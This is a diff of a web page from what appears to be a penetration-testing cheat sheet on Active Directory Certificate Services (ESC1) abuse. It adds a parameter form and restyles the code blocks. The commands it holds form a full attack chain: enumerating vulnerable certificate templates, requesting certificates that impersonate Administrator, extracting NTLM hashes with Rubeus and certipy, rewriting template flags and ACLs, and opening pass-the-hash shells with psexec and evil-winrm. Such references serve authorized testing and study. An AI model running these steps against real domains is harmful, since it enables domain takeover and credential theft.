@@ -201,8 +201,131 @@
   <li><a href="https://tldrbins.github.io/@passthecert/">PassTheCert</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="enum-from-linux">Enum (From Linux)</h3>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">certipy-ad</button>
@@ -210,13 +333,13 @@
 <button data-tabset="set1" data-tabcontent="tab2" >nxc</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy-ad find -u &lt;USER&gt; -p &lt;PASSWORD&gt; -target &lt;TARGET&gt; -text -stdout -vulnerable
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad find -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; -target &lt;TARGET&gt; -text -stdout -vulnerable
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap &lt;TARGET&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; -M adcs
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc ldap &lt;TARGET&gt; -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; -M adcs
+</span></span></span></code></pre></div></div>
 </div></p>
 <h3 id="enum-from-windows">Enum (From Windows)</h3>
 <p>
@@ -227,27 +350,27 @@
 <button data-tabset="set2" data-tabcontent="tab3" >ADCSTemplate</button>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Check ADCS service</span>
-</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="nb">start </span><span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="n">cert</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Check env</span>
-</span></span><span class="line"><span class="cl"><span class="n">certutil</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># List cert templates</span>
-</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-catemplates</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check ADCS service
+</span></span><span class="line"><span class="cl"><span class="go">net start | findstr /i cert
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check env
+</span></span><span class="line"><span class="cl"><span class="go">certutil
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> List cert templates
+</span></span><span class="line"><span class="cl"><span class="go">certutil -catemplates
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get info of each template</span>
-</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">certify</span><span class="p">.</span><span class="py">exe</span> <span class="n">find</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Find vuln templates</span>
-</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">certify</span><span class="p">.</span><span class="py">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span> <span class="p">/</span><span class="n">currentuser</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get info of each template
+</span></span><span class="line"><span class="cl"><span class="go">.\certify.exe find
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Find vuln templates
+</span></span><span class="line"><span class="cl"><span class="go">.\certify.exe find /vulnerable /currentuser
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab3"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">ADCSTemplate</span><span class="p">.</span><span class="py">psm1</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">get-adcstemplate</span> <span class="p">|</span> <span class="nb">fl </span><span class="n">displayname</span>
-</span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/GoateePFE/ADCSTemplate">ADCSTemplate</a></em></small></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\ADCSTemplate.psm1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">get-adcstemplate | fl displayname
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/GoateePFE/ADCSTemplate">ADCSTemplate</a></em></small></p>
 </div></div></p>
 <br>
 <hr>
@@ -256,42 +379,42 @@
 <button data-tabset="set3" data-tabcontent="tab1" class="active">Windows</button>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">certify</span><span class="p">.</span><span class="py">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">ca</span><span class="err">:</span><span class="p">&lt;</span><span class="n">CONFIG</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">template</span><span class="err">:</span><span class="n">User</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem</span>
-</span></span><span class="line"><span class="cl"><span class="n">openssl</span> <span class="n">pkcs12</span> <span class="n">-in</span> <span class="n">cert</span><span class="p">.</span><span class="py">pem</span> <span class="n">-keyex</span> <span class="n">-CSP</span> <span class="s2">&#34;Microsoft Enhanced Cryptographic Provider v1.0&#34;</span> <span class="n">-export</span> <span class="n">-out</span> <span class="n">cert</span><span class="p">.</span><span class="py">pfx</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get NTLM hash</span>
-</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="p">&lt;</span><span class="n">USER</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">certificate</span><span class="err">:</span><span class="n">cert</span><span class="p">.</span><span class="py">pfx</span> <span class="p">/</span><span class="n">getcredentials</span> <span class="p">/</span><span class="n">show</span> <span class="p">/</span><span class="n">nowrap</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\certify.exe request /ca:&lt;CONFIG&gt; /template:User
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem
+</span></span><span class="line"><span class="cl"><span class="go">openssl pkcs12 -in cert.pem -keyex -CSP &#39;Microsoft Enhanced Cryptographic Provider v1.0&#39; -export -out cert.pfx
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get NTLM <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:&lt;USER&gt; /certificate:cert.pfx /getcredentials /show /nowrap
+</span></span></span></code></pre></div></div>
 </div></p>
 <br>
 <hr>
 <h3 id="esc1">ESC1</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+----------------------------------------------------------+
-</span></span><span class="line"><span class="cl">| Enabled                        : True                    |
-</span></span><span class="line"><span class="cl">| Client Authentication          : True                    |
-</span></span><span class="line"><span class="cl">| Enrollee Supplies Subject      : True                    |
-</span></span><span class="line"><span class="cl">| Certificate Name Flag          : EnrolleeSuppliesSubject |
-</span></span><span class="line"><span class="cl">| Requires Management Approval   : False                   |
-</span></span><span class="line"><span class="cl">| Authorized Signatures Required : 0                       |
-</span></span><span class="line"><span class="cl">+----------------------------------------------------------+
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+----------------------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="go">| Enabled                        : True                    |
+</span></span></span><span class="line"><span class="cl"><span class="go">| Client Authentication          : True                    |
+</span></span></span><span class="line"><span class="cl"><span class="go">| Enrollee Supplies Subject      : True                    |
+</span></span></span><span class="line"><span class="cl"><span class="go">| Certificate Name Flag          : EnrolleeSuppliesSubject |
+</span></span></span><span class="line"><span class="cl"><span class="go">| Requires Management Approval   : False                   |
+</span></span></span><span class="line"><span class="cl"><span class="go">| Authorized Signatures Required : 0                       |
+</span></span></span><span class="line"><span class="cl"><span class="go">+----------------------------------------------------------+
+</span></span></span></code></pre></div></div>
 <h4 id="abuse-1-add-smartcard-logon">Abuse #1: Add smartcard logon</h4>
 <p>
 <button data-tabset="set4" data-tabcontent="tab1" class="active">Windows</button>
 
 <div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">ADCS</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Add smartcart logon</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-SmartCardCertificate</span> <span class="n">-Identity</span> <span class="n">Administrator</span> <span class="n">-TemplateName</span> <span class="p">&lt;</span><span class="n">VULN_TEMPLATE</span><span class="p">&gt;</span> <span class="n">-NoSmartCard</span> <span class="n">-Verbose</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get Cert_Thumbprint</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-ChildItem</span> <span class="n">cert</span><span class="err">:</span><span class="p">\</span><span class="n">currentuser</span><span class="p">\</span><span class="n">my</span> <span class="n">-recurse</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get NTLM hash</span>
-</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">certificate</span><span class="err">:</span><span class="p">&lt;</span><span class="n">Thumbprint</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">getcredentials</span> <span class="p">/</span><span class="n">show</span> <span class="p">/</span><span class="n">nowrap</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote</span>
-</span></span><span class="line"><span class="cl">impacket-psexec -hashes :&lt;HASH&gt; administrator@&lt;DOMAIN&gt; cmd.exe
-</span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/cfalta/PoshADCS">PoshADCS</a></em></small></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\ADCS.ps1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add smartcart logon
+</span></span><span class="line"><span class="cl"><span class="go">Get-SmartCardCertificate -Identity Administrator -TemplateName &lt;VULN_TEMPLATE&gt; -NoSmartCard -Verbose
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get Cert_Thumbprint
+</span></span><span class="line"><span class="cl"><span class="go">Get-ChildItem cert:\currentuser\my -recurse
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get NTLM <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:Administrator /certificate:&lt;THUMBPRINT&gt; /getcredentials /show /nowrap
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remote
+</span></span><span class="line"><span class="cl"><span class="go">impacket-psexec -hashes :&lt;HASH&gt; administrator@&lt;DOMAIN&gt; cmd.exe
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/cfalta/PoshADCS">PoshADCS</a></em></small></p>
 </div></div></p>
 <h4 id="abuse-2-set-alternative-name">Abuse #2: Set alternative name</h4>
 <p>
@@ -299,109 +422,110 @@
 
 <button data-tabset="set5" data-tabcontent="tab2" >Windows</button>
 
-<div class="tabcontent" data-tabset="set5" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Generate Cert with altname</span>
-</span></span><span class="line"><span class="cl">certipy-ad req -u &lt;USER&gt; -p &lt;PASSWORD&gt; -target &lt;TARGET&gt; -upn administrator@&lt;DOMAIN&gt; -ca &lt;CA_NAME&gt; -template &lt;VULN_TEMPLATE&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get NTLM hash</span>
-</span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> certipy-ad auth -pfx administrator.pfx
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote</span>
-</span></span><span class="line"><span class="cl">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
-</span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set5" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Generate Cert with altname
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; -target &lt;TARGET&gt; -upn administrator@&lt;DOMAIN&gt; -ca &lt;CA_NAME&gt; -template &lt;VULN_TEMPLATE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get NTLM <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; certipy-ad auth -pfx administrator.pfx
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remote
+</span></span><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
+</span></span></span></code></pre></div></div>
 
-<div class="tabcontent" data-tabset="set5" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Generate Cert with altname</span>
-</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="py">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">ca</span><span class="err">:</span><span class="p">&lt;</span><span class="n">CA_NAME</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">template</span><span class="err">:</span><span class="p">&lt;</span><span class="n">VULN_TEMPLATE</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">altname</span><span class="err">:</span><span class="n">administrator</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem</span>
-</span></span><span class="line"><span class="cl">openssl pkcs12 -in cert.pem -keyex -CSP <span class="s2">&#34;Microsoft Enhanced Cryptographic Provider v1.0&#34;</span> -export -out cert.pfx
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get NTLM hash</span>
-</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">certificate</span><span class="err">:</span><span class="n">cert</span><span class="p">.</span><span class="py">pfx</span> <span class="p">/</span><span class="n">getcredentials</span> <span class="p">/</span><span class="n">show</span> <span class="p">/</span><span class="n">nowrap</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote</span>
-</span></span><span class="line"><span class="cl">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
-</span></span></code></pre></div></div></p>
+<div class="tabcontent" data-tabset="set5" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Generate Cert with altname
+</span></span><span class="line"><span class="cl"><span class="go">.\Certify.exe request /ca:&lt;CA_NAME&gt; /template:&lt;VULN_TEMPLATE&gt; /altname:administrator
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem
+</span></span><span class="line"><span class="cl"><span class="go">openssl pkcs12 -in cert.pem -keyex -CSP &#39;Microsoft Enhanced Cryptographic Provider v1.0&#39; -export -out cert.pfx
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get NTLM <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remote
+</span></span><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
+</span></span></span></code></pre></div></div></p>
 <h4 id="abuse-3-set-mspki-certificate-name-flag">Abuse #3: Set msPKI-Certificate-Name-Flag</h4>
 <p>
 <button data-tabset="set6" data-tabcontent="tab1" class="active">Windows</button>
 
 <div class="tabcontent" data-tabset="set6" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">ADCSTemplate</span><span class="p">.</span><span class="py">psm1</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Export-ADCSTemplate</span> <span class="n">-displayName</span> <span class="p">&lt;</span><span class="n">VULN_TEMPLATE</span><span class="p">&gt;</span> <span class="p">&gt;</span> <span class="n">template</span><span class="p">.</span><span class="py">json</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$template</span> <span class="p">=</span> <span class="nb">cat </span><span class="n">template</span><span class="p">.</span><span class="py">json</span> <span class="n">-raw</span> <span class="p">|</span> <span class="nb">ConvertFrom-Json</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$template</span><span class="p">.</span><span class="s1">&#39;msPKI-Certificate-Name-Flag&#39;</span> <span class="p">=</span> <span class="n">0x1</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$template</span> <span class="p">|</span> <span class="nb">ConvertTo-Json</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">template_mod</span><span class="p">.</span><span class="py">json</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-ADCSTemplate</span> <span class="n">-DisplayName</span> <span class="s2">&#34;vuln_esc1&#34;</span> <span class="n">-Publish</span> <span class="n">-JSON</span> <span class="p">(</span><span class="nb">cat </span><span class="n">template_mod</span><span class="p">.</span><span class="py">json</span> <span class="n">-raw</span><span class="p">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-ADCSTemplateACL</span> <span class="n">-DisplayName</span> <span class="s2">&#34;vuln_esc1&#34;</span> <span class="n">-type</span> <span class="n">allow</span> <span class="n">-identity</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span> <span class="n">-enroll</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Generate Cert with altname</span>
-</span></span><span class="line"><span class="cl">certipy-ad req -u &lt;USER&gt; -p &lt;PASSWORD&gt; -target &lt;TARGET&gt; -upn administrator@&lt;DOMAIN&gt; -ca &lt;CA_NAME&gt; -template vuln_esc1
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get NTLM hash</span>
-</span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> certipy-ad auth -pfx administrator.pfx
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote</span>
-</span></span><span class="line"><span class="cl">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
-</span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/GoateePFE/ADCSTemplate">ADCSTemplate</a></em></small></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\ADCSTemplate.psm1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Export-ADCSTemplate -displayName &lt;VULN_TEMPLATE&gt; &gt; template.json
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">template</span> <span class="o">=</span> cat template.json -raw <span class="p">|</span> ConvertFrom-Json
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>template.<span class="s1">&#39;msPKI-Certificate-Name-Flag&#39;</span> <span class="o">=</span> 0x1
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>template <span class="p">|</span> ConvertTo-Json <span class="p">|</span> Set-Content template_mod.json
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">New-ADCSTemplate -DisplayName &#39;vuln_esc1&#39; -Publish -JSON (cat template_mod.json -raw)
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-ADCSTemplateACL -DisplayName &#39;vuln_esc1&#39; -type allow -identity &#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39; -enroll
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Generate Cert with altname
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; -target &lt;TARGET&gt; -upn administrator@&lt;DOMAIN&gt; -ca &lt;CA_NAME&gt; -template vuln_esc1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get NTLM <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; certipy-ad auth -pfx administrator.pfx
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remote
+</span></span><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/GoateePFE/ADCSTemplate">ADCSTemplate</a></em></small></p>
 </div></div></p>
 <br>
 <hr>
